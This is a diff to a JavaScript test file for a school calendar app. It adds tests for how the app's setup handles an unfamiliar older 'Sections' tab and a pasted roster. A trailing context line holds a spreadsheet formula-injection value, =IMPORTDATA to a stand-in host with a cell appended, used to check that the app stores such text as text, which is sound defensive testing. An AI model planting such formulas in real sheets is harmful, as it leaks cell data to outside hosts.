@@ -338,6 +338,39 @@ test('Set up never makes a second person ADMIN', () => {
   assert.deepEqual(admins, ['admin@school.example']);
 });
 
+test('Set up names a tab that seems to belong to something else, and leaves it as it is', () => {
+  const t = fresh({ sync: false });
+  // An earlier version of the calendar made its own Sections tab. Only 'status' is also one of the app's columns.
+  const old = ['Section', 'Grade', 'Subject', 'Teacher', 'status'];
+  const oldRow = ['9A', '9', 'Biology', 'ms.a@school.example', 'Open'];
+  t.backend.db.Sections = { headers: old.slice(), rows: [oldRow.slice()] };
+  g.Store.invalidate();
+  const r = g.Setup.run();
+  assert.deepEqual(r.foreign, { Sections: 4 });
+  const message = g.Setup.describe(r);
+  assert.match(message, /^Sections: 4 columns the app does not use$/m);
+  assert.match(message, /rename each one, e\.g\. to "Sections \(earlier version\)", and run Set up again/);
+  // The app's columns go after the old ones, which keep their place and their row.
+  const tab = t.backend.db.Sections;
+  assert.deepEqual(tab.headers.slice(0, old.length), old);
+  assert.deepEqual(tab.rows.map((row) => row.slice(0, old.length)), [oldRow]);
+});
+
+test('Set up gives no such warning for its own tabs or a pasted roster', () => {
+  const t = fresh({ sync: false });
+  // The Roster tab holds IT's export as it comes, so none of its columns are the app's.
+  t.backend.db.Roster = { headers: ['SectionID', 'Course_Number', '[1]student_number'], rows: [['9101', 'G09ENG', '9001']] };
+  g.Store.invalidate();
+  let r = g.Setup.run();
+  assert.deepEqual(r.foreign, {});
+  assert.doesNotMatch(g.Setup.describe(r), /does not use|earlier version/);
+  // Nor the next time, when the tabs it has just made are there too.
+  g.Store.invalidate();
+  r = g.Setup.run();
+  assert.deepEqual(r.created, []);
+  assert.deepEqual(r.foreign, {});
+});
+
 test('text that looks like a formula is stored as text', () => {
   const t = fresh();
   const res = call(g, 'apiCreate', draft(t, 'B09BIO', '2026-10-27', { title: '=IMPORTDATA("https://x.example/?"&A2)' }));
